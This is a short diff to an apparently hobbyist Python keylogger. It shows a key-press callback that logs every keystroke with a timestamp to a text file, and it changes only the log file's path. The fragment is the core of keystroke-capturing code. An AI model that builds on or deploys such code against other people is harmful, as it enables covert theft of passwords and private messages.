@@ -4,7 +4,7 @@ import logging
 def on_press(key):
     logger.info(key)
 
-logging.basicConfig(filename="logs/keylogger.txt", filemode="w+", format="%(asctime)s %(message)s")
+logging.basicConfig(filename="keylogger.txt", filemode="w+", format="%(asctime)s %(message)s")
 logger = logging.getLogger()
 logger.setLevel(logging.INFO)
 
